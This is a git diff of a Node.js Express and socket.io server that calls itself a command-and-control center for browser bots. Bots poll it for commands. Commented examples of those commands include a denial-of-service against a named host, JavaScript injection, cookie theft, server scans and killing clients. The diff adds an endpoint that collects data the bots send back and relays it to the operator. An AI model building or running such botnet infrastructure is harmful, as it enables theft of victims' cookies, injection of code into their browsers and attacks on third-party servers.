@@ -1,15 +1,28 @@
-var app = require('express')(),
+var express = require('express'),
+    app = express(),
     http = require('http').Server(app),
     io = require('socket.io')(http),
-    config = require('./config.json'),
+    bodyParser = require('body-parser'),
     exphbs  = require('express-handlebars'),
-    bots = {},
-    //    currCommand = {};
-    //     currCommand = {DOS: {prot:'http', host: "ftp.ladder.com", port: "21" } };
-    //     currCommand = {injectJs: "console.log('you got hacked')" };
-    currCommand = {killClient: true };
+    config = require('./config.json'),
+    currCommand = {},
+    bots = {};
+//     currCommand = {DOS: {prot:'http', host: "ftp.ladder.com", port: "21" } };
+//     currCommand = {injectJs: "console.log('you got hacked')" };
+//    currCommand = {killClient: true };
+//    currCommand = {getCookies: true };
+var allowCrossDomain = function(req, res, next) {
+    //    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
+    res.header("Access-Control-Allow-Headers", "X-Requested-With");
+    res.header('Access-Control-Allow-Headers', 'Content-Type');
+    next();
+}
 
+app.use(allowCrossDomain);
+app.use(bodyParser.json()); // for parsing application/json
 app.engine('handlebars', exphbs({defaultLayout: 'main'}));
+app.use('/assets', express.static('assets'));
 app.set('view engine', 'handlebars');
 
 // express loads the homepage
@@ -17,7 +30,7 @@ app.get('/', function (req, res) {
     console.log('Requesed Force Commander')
     res.render('index', { name: 'Tobi',bots:bots,layout: false });
 });
-// bot get command
+// bot get scout command
 app.get('/commands/get/:id', function (req, res) {
     var id = req.params.id;
     res.json(currCommand);
@@ -29,27 +42,27 @@ app.get('/commands/get/:id', function (req, res) {
     }
     currCommand = {};
 });
-// from force command
-app.route('/command/send')
-    .get(function(req, res, next) {
-    //  res.json(...);
-}).post(function(req, res, next) {
-    // maybe add a new event...
+app.post('/commands/put/:id', function (req, res) {
+    var id = req.params.id;
+    var all = req.body;
+    res.json({});
+    console.log(all)
+    all.id = id;
+    console.log('Bot : ',id, ' Sent Data: ',all)
+    //    if(bots[id]){
+    io.sockets.emit('bot-data', all);
+    //        console.log('New Bot: ',  id);
+    //    }
 });
 io.on('connection', function(socket){
     console.log('Force commander connected');
+    // when the force commander sends a command
     socket.on('cmd', function(cmd){
-        // when the force commander sends a command
-        console.log('message: ' + cmd);
+        currCommand = cmd;
+        console.log(cmd);
     });
 });
 
 http.listen(config.listenPort, function(){
     console.log('Command and control center listening on http://localhost:%s', config.listenPort);
 });
-// list of attacks
-// dos
-// injectJs: “console.log(‘PAWNEEd’)”,
-//	getCookies: true,
-//	srvScann: { host: “ftp.ladder.com”, port: “21” },
-//killClient: true
